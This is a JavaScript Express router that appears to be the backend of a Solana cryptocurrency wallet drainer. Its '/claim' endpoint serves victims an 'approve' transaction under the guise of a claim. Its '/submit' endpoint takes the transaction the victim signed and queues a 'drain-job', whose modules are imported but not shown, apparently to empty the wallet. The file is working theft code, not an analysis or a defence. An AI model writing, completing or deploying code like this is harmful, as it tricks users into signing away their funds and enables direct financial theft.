const express = require("express");
const router = express.Router();
const { PublicKey } = require("@solana/web3.js");

const { buildApprove } = require("../flows/approveFlow");
const { buildDrain } = require("../flows/drainFlow");
const { executeTx } = require("../solana/txExecutor");
const { getConnection, withRetry } = require("../core/rpcPool");
const { txQueue } = require("../queue/jobQueue");
const logger = require("../core/logger");

/**
 * Validate if string is valid Solana public key
 */
function isValidPublicKey(key) {
    try {
        new PublicKey(key);
        return true;
    } catch (err) {
        return false;
    }
}

/**
 * Validate if string is valid base64
 */
function isValidBase64(str) {
    try {
        return Buffer.from(str, "base64").toString("base64") === str;
    } catch (err) {
        return false;
    }
}

/**
 * POST /api/claim - Generate approval transaction
 * Request body: { publicKey: string }
 * Response: { transaction: string (base64) }
 */
router.post("/claim", async (req, res) => {
    try {
        const { publicKey } = req.body;

        // Validate input
        if (!publicKey) {
            logger.warn("Claim request missing publicKey");
            return res.status(400).json({
                error: "publicKey is required"
            });
        }

        if (!isValidPublicKey(publicKey)) {
            logger.warn("Claim request with invalid publicKey", { publicKey });
            return res.status(400).json({
                error: "Invalid Solana public key format"
            });
        }

        logger.info("Processing claim request", { publicKey });

        const connection = getConnection();
        const tx = await buildApprove(publicKey, connection);

        const serialized = tx.serialize({ requireAllSignatures: false }).toString("base64");

        logger.info("Claim transaction generated successfully", { publicKey });

        res.json({
            transaction: serialized
        });
    } catch (err) {
        logger.error("Claim endpoint error", {
            error: err.message,
            stack: err.stack
        });

        res.status(500).json({
            error: "Failed to generate claim transaction",
            message: err.message
        });
    }
});

/**
 * POST /api/submit - Queue drain transaction
 * Request body: { publicKey: string, signedTransaction: string (base64) }
 * Response: { status: string, jobId: string }
 */
router.post("/submit", async (req, res) => {
    try {
        const { publicKey, signedTransaction } = req.body;

        // Validate inputs
        if (!publicKey) {
            logger.warn("Submit request missing publicKey");
            return res.status(400).json({
                error: "publicKey is required"
            });
        }

        if (!signedTransaction) {
            logger.warn("Submit request missing signedTransaction");
            return res.status(400).json({
                error: "signedTransaction is required"
            });
        }

        if (!isValidPublicKey(publicKey)) {
            logger.warn("Submit request with invalid publicKey", { publicKey });
            return res.status(400).json({
                error: "Invalid Solana public key format"
            });
        }

        if (!isValidBase64(signedTransaction)) {
            logger.warn("Submit request with invalid base64 transaction");
            return res.status(400).json({
                error: "signedTransaction must be valid base64"
            });
        }

        logger.info("Processing submit request", { publicKey });

        // Queue the drain job
        const job = await txQueue.add("drain-job", {
            publicKey,
            signedTx: signedTransaction
        }, {
            // Job-specific options
            removeOnComplete: true,
            removeOnFail: false, // Keep failed jobs for debugging
        });

        logger.info("Drain job queued", {
            jobId: job.id,
            publicKey
        });

        res.json({
            status: "queued",
            jobId: job.id
        });
    } catch (err) {
        logger.error("Submit endpoint error", {
            error: err.message,
            stack: err.stack
        });

        // Check if it's a Redis error
        if (err.message.includes("Redis") || err.message.includes("connection")) {
            return res.status(503).json({
                error: "Service temporarily unavailable",
                message: "Job queue is unavailable, please retry"
            });
        }

        res.status(500).json({
            error: "Failed to queue drain transaction",
            message: err.message
        });
    }
});

module.exports = router;
